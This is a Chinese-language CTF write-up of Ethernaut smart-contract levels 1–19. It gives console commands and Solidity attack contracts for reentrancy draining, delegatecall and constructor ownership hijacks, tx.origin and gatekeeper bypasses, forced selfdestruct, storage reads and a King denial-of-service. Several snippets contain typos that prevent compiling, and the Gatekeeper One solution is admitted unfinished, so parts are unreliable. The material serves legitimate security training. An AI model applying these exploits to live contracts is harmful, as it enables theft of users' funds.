###  1. 你好Ethernaut
##### 按照提示输入以下指令
**await contract.info()**
"You will find what you need in info1()."

**await contract.info1()**
"Try info2(), but with "hello" as a parameter."

**await contract.info2("hello")**
"The property infoNum holds the number of the next info method to call."

**await contract.infoNum()**
42

**await contract.info42()**
"theMethodName is the name of the next method."

**await contract.theMethodName()**
"The method name is method7123949."

**await contract.method7123949()**
"If you know the password, submit it to authenticate()."

**await contract.password()**
"ethernaut0"

**await contract.authenticate("ethernaut0")**
### 2. Fallback
##### 对合约转账1wei从而改变其balance,调用sendTransaction函数触发fallback获取合约的owner变为自己的地址，再用withdraw转走合约的代币ine
await getBalance(instance)

await contract.contribute({value:1})

await getBalance(instance)

await contract.sendTransation({value:1})

await contract.owner()

await contract.withdraw()
### 3. Fallout
##### 查看合约的owner,调用函数来更换合约的owner 构造函数名称与合约名称不一致使其成为一个public类型的函数，同时在构造函数中指定了函数调用者直接为合约的owner，所以我们可以直接调用构造函数Fal1out来获取合约的ower权限。
await contract.owner()

await contract.Fallout()

await contract.owner()
### 4. Coin Flip
##### 写攻击合约，攻击十次
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../CoinFlip.sol';

contract CoinFlipAttack {
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  
  function attack(address_victim) public returns (bool) {
    CoinFlip coinflip = CoinFlip( victim);
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool side = coinFlip == 1 ? ture : false;
    coinflip.flip(side);
    return side;
   }
 }
 连续attack10次
 ### 5.Telephone
 ##### 调用攻击合约，调用受害者合约，输入自己的地址从而改变受害者合约的owner
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../Telephone.sol';
contract TelephoneAttack{

    Telephone phone;
    
    constructor(address _telephone) {
        phone = Telephone(_telephone);
    }
    
    fuction attack(address _owner) public {
       phone.changeOwner(_owner);
    }
 }

await contract.owner();
### 6. Token
##### 调用transfer函数向自己转币
await contract.balanceOf(player)

player

contract.transfer(地址)
### 7.Delegation
##### 通过delegatecall调用pwn函数更换owner
player

await contract.address

contract.sendTransaction({data: web3.sha3("pwn()").slice(0,10)});

await contract.owner

await contract.owner()
### 8.Force
##### 创建一个合约，转入部分eth，调用selfdestruct将新合约中的eth发给合约
await contract.address()

pragma solidity ^0.8.0;
contract Force {
 function Force() public payable {}
 function exploit(address _ target) public {
    selfdestruct(_ target);
 }
}
调用ForceSendEter(),传入合约地址
### 9. Vault
##### getStorageAt函数可以让我们访问合约里状态变量的值，它的两个参数里第一个是合约的地址，第二个则是变量位置position
运行 web3.eth.getStorageAt(contract.address, 1, function(x, y) {alert(web3.toAscii(y))});
解锁合约

### 10. King
##### 部署攻击合约进行revert
pragma solidity ^0.8.0;

contract attack{
    function attack(address _ addr) public payable{
        _ addr.call.gas(10000000).value(msg.value)();
    }
    function () public {
        revert();
    }
}
prize = await contract.prize()

fromWei(print.toNumber())

await contract.address

await contract.king()
### 11.Re-entrancy

##### 重入攻击，让它卡在call.value这里不断给我们发送ether，同样利用的是我们熟悉的fallback函数来实现
##### call.value函数特性，当我们使用call.value()来调用代码时，执行的代码会被赋予账户所有可用的gas,这样就能保证我们的fallback函数能被顺利执行
攻击合约
pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to]+msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}

contract ReentrancePoc {

    Reentrance reInstance;

    function getEther() public {
        msg.sender.transfer(address(this).balance);
    }

    function ReentrancePoc(address _addr) public{
        reInstance = Reentrance(_addr);
    }
    function callDonate() public payable{
        reInstance.donate.value(msg.value)(this);
    }

    function attack() public {
        reInstance.withdraw(1 ether);
    }

  function() public payable {
      if(address(reInstance).balance >= 1 ether){
        reInstance.withdraw(1 ether);
      }
  }
}

##### 完成withdraw的检查 contract.donate.sendTransaction("0xeE59e9DC270A52477d414f0613dAfa678Def4b02",{value: toWei(1)})
运行attack函数

### 12. Elevator
##### 调用attack来实施攻击
pragma solidity ^0.8.0;
interface Building {
  function isLastFloor(uint) view public returns (bool);
}
contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _ floor) public {
    Building building = Building(msg.sender);
    if (!building.isLastFloor(_ floor)) {
      floor = _ floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract BuildingEXP{
    Elevator ele;
    bool t = true;
    function isLastFloor(uint) view public returns (bool) {
        t = !t;
        return t;
    }
    function attack(address _ addr) public{
        ele = Elevator(_ addr);
        ele.goTo(5);
    }
}
await contract.address

await contract.floor()

await contract.top()

await contract.top()
### 13. Privacy
##### 将第四个存储槽内容取出，并将前16字节内容由于unlock   
web3.eth.getStorageAt(instance,3,function(x,y){console.info(y);})

### 14.Gatekeeper One
##### 从上面了解到要想enter需要满足gateOne、gateTwo、gateThree三个修饰器的检查条件，即需要满足以下条件：
##### 1、gateOne ：这个通过部署一个中间恶意合约即可绕过
##### 2、gateTwo ：这里的msg.gas 指的是运行到当前指令还剩余的 gas 量，要能整除 8191。那我们只需要 8191+x ，x 为从开始到运行完 msg.gas 所消耗的 gas。通过查阅资料发现msg.gas在文档里的描述是remaining gas，在Javascript VM环境下进行Debug可在Step detail 栏中可以看到这个变量，笔者在调试过程中未发现合适的gas值，暂未成功！
##### 3、gateThree() 也比较简单，将 tx.origin 倒数三四字节换成 0000 即可。 bytes8(tx.origin) & 0xFFFFFFFF0000FFFF 即可满足条件。
进行攻击合约

### 15.Gatekeeper Two
##### 第一个条件：我们可以通过部署合约来实现绕过
##### 第二个条件：gateTwo中extcodesize 用来获取指定地址的合约代码大小。这里使用的是内联汇编来获取调用方(caller)的代码大小，一般来说，当caller为合约时，获取的大小为合约字节码大小,caller为账户时，获取的大小为 0 。条件为调用方代码大小为0 ，由于合约在初始化，代码大小为0的。因此，我们需要把攻击合约的调用操作写在 constructor 构造函数中。
##### 第三个条件：这里判断的是msg.sender，所以要在代码里进行实时计算。异或的特性就是异或两次就是原数据。所以将sender和FFFFFFFFFFFFFFFF进行异或的值就是我们想要的值。
攻击合约
pragma solidity ^0.4.18;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract attack{
    function attack(address param){
        GatekeeperTwo a =GatekeeperTwo(param);
        bytes8 _gateKey = bytes8((uint64(0) -1) ^ uint64(keccak256(this)));
        a.enter(_gateKey);
    }
}

### 16.Naught Coin
##### await contract.approve(player,toWei(1000000))
##### await contract.transferFrom(player,contract.address,toWei(1000000))
使用approve进行授权

### 17.Preservation
##### 调用Preservation的setFirstTime函数时候实际通过delegatecall 执行了LibraryContract的setTime函数，修改了slot 1，也就是修改了timeZone1Library变量。 这样，我们第一次调用setFirstTime将timeZone1Library变量修改为我们的恶意合约的地址，第二次调用setFirstTime就可以执行我们的任意代码了
pragma solidity ^0.4.23;

contract PreservationPoc {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;

  function setTime(uint _time) public {
    owner = address(_time);
  }
}
await contract.setSecondTime(恶意合约地址)
await contract.setFirstTime(player地址)

### 18.locked
##### _name设置为bytes32(1)就可以将unlocked变为“ture”
NameRecord newRecord;
newRecord.name = _name;
newRecord.mappedAddress = _mappedAddress;
pragma solidity ^0.4.23; 

// A Locked Name Registrar
contract Locked {

    bool public unlocked = false;  // registrar locked, no name updates

    struct NameRecord { // map hashes to addresses
        bytes32 name; // 
        address mappedAddress;
    }

    mapping(address => NameRecord) public registeredNameRecord; // records who registered names 
    mapping(bytes32 => address) public resolve; // resolves hashes to addresses

    function register(bytes32 _name, address _mappedAddress) public {
        // set up the new NameRecord
        NameRecord newRecord;
        newRecord.name = _name;
        newRecord.mappedAddress = _mappedAddress; 

        resolve[_name] = _mappedAddress;
        registeredNameRecord[msg.sender] = newRecord; 

        require(unlocked); // only allow registrations if contract is unlocked
    }
}

contract attack{
    function hack(address param){
        Locked a = locked(param);
        a.register(bytes32(1),address(msg.sender));
    }
}

### 19.Recovery
##### 借助destory函数来实现
pragma solidity ^0.4.23;

contract SimpleToken {

  // public variables
  string public name;
  mapping (address => uint) public balances;

  // collect ether in return for tokens
  function() public payable ;

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public ;

  // clean up after ourselves
  function destroy(address _to) public ;
}

contract RecoveryPoc {
    SimpleToken target;
    constructor(address _addr) public{
        target = SimpleToken(_addr);
    }

    function attack() public{
        target.destroy(tx.origin);
    }

}





















